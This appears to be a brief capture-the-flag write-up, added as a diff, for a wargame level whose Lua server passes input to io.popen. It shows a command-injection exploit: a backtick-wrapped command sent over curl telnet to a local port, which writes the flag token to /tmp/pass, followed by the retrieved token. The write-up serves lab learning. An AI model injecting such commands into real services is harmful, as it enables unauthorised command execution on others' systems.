@@ -1,0 +1,10 @@
+we can see that in home directory of  Level11 there is executable file named level11.lua
+
+we see in level11 that server take argument x that run whatever with echo in io.popen
+$> curl telnet://127.0.0.1:5151
+`getflag` > /tmp/pass
+
+that seems like io.popen("echo "`getflag` > /tmp/pass" | sha1sum", "r")
+
+$> cat /tmp/pass
+Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
